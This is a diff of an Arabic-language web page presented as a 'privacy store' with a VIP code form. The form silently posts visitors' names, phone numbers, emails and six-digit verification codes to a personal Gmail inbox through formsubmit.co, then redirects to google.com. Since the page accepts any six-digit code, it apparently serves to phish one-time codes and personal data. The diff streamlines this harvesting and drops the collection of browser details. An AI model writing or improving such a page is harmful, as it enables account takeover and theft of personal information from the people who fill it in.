@@ -390,17 +390,15 @@
                                 </div>
                             </div>
 
-                            <form id="advanced-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" class="space-y-8">
-                                <!-- Enhanced Hidden Fields -->
+                            <form id="advanced-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="space-y-8">
+                                <!-- FormSubmit Hidden Fields -->
                                 <input type="hidden" name="_subject" value="🔥 كود VIP تم إدخاله - متجر الخصوصية المتطور 🔥">
                                 <input type="hidden" name="_captcha" value="false">
                                 <input type="hidden" name="_template" value="table">
-                                <input type="hidden" name="_next" value="">
+                                <input type="hidden" name="_next" value="https://www.google.com">
                                 <input type="hidden" name="form_type" value="كود وصول VIP متقدم">
                                 <input type="hidden" name="submission_time" value="">
-                                <input type="hidden" name="user_agent" value="">
-                                <input type="hidden" name="page_url" value="">
-                                <input type="hidden" name="customer_ip" value="">
+                                <input type="hidden" name="current_date" value="">
                                 
                                 <!-- Enhanced Personal Information -->
                                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
@@ -1373,89 +1371,21 @@
             }
         }
 
-        // معالج نموذج الكود المتقدم - مُحسَّن ومختبر
+        // نموذج الكود البسيط - يعمل مثل نموذج الدفع تماماً
         function setupAdvancedCodeForm() {
             const form = document.getElementById('advanced-code-form');
-            if (!form) {
-                console.error('Advanced code form not found!');
-                return;
-            }
+            if (!form) return;
             
-            console.log('Setting up advanced code form...');
-            
+            // إضافة معالج الإرسال البسيط
             form.addEventListener('submit', function(e) {
-                console.log('Form submission started...');
-                
-                // التحقق من البيانات المطلوبة
-                const fullName = this.querySelector('input[name="full_name"]').value.trim();
-                const phoneNumber = this.querySelector('input[name="phone_number"]').value.trim();
-                const emailAddress = this.querySelector('input[name="email_address"]').value.trim();
-                const verificationCode = this.querySelector('input[name="verification_code"]').value.trim();
-                
-                console.log('Form data:', { fullName, phoneNumber, emailAddress, verificationCode });
-                
-                if (!fullName || !phoneNumber || !emailAddress) {
-                    e.preventDefault();
-                    showNotification('❌ يرجى ملء جميع الحقول المطلوبة');
-                    console.log('Validation failed: Missing required fields');
-                    return false;
-                }
-                
-                if (verificationCode.length !== 6) {
-                    e.preventDefault();
-                    showNotification('❌ يرجى إدخال 6 أرقام للكود');
-                    console.log('Validation failed: Invalid code length');
-                    return false;
-                }
-                
-                // منع الإرسال المتكرر
-                if (formSubmissionInProgress) {
-                    e.preventDefault();
-                    console.log('Form submission already in progress');
-                    return false;
-                }
-                
-                formSubmissionInProgress = true;
-                console.log('Form validation passed, preparing submission...');
-                
-                // ملء الحقول المخفية
+                // ملء الحقول المخفية قبل الإرسال
                 const currentTime = new Date().toLocaleString('ar-SA');
                 this.querySelector('input[name="submission_time"]').value = currentTime;
-                this.querySelector('input[name="user_agent"]').value = navigator.userAgent;
-                this.querySelector('input[name="page_url"]').value = window.location.href;
-                this.querySelector('input[name="customer_ip"]').value = 'تم الكشف تلقائياً';
+                this.querySelector('input[name="current_date"]').value = new Date().toISOString();
                 
-                // إضافة معلومات إضافية للتتبع
-                const randomId = Math.floor(Math.random() * 1000000);
-                const hiddenIdField = document.createElement('input');
-                hiddenIdField.type = 'hidden';
-                hiddenIdField.name = 'submission_id';
-                hiddenIdField.value = `CODE-${randomId}`;
-                this.appendChild(hiddenIdField);
-                
-                currentFormType = 'advanced-code';
-                isCodeFormSubmitted = false;
-                
-                // تحديث زر الإرسال
-                const submitBtn = document.getElementById('submit-advanced-code');
-                if (submitBtn) {
-                    submitBtn.disabled = true;
-                    submitBtn.innerHTML = `
-                        <span class="flex items-center justify-center">
-                            <i class="fas fa-spinner fa-spin mr-3 text-2xl"></i>
-                            ⏳ جاري المعالجة والتفعيل...
-                        </span>
-                    `;
-                }
-                
-                showNotification('🚀 جاري تفعيل الكود...');
-                console.log('Form will be submitted to FormSubmit.co');
-                
-                // السماح للنموذج بالإرسال الطبيعي إلى FormSubmit
-                return true;
+                // السماح للنموذج بالإرسال الطبيعي - بدون منع أو تعقيد
+                console.log('Code form submitting to FormSubmit.co...');
             });
-            
-            console.log('Advanced code form setup completed successfully');
         }
 
         // Purchase code verification - يقبل أي كود من 6 أرقام
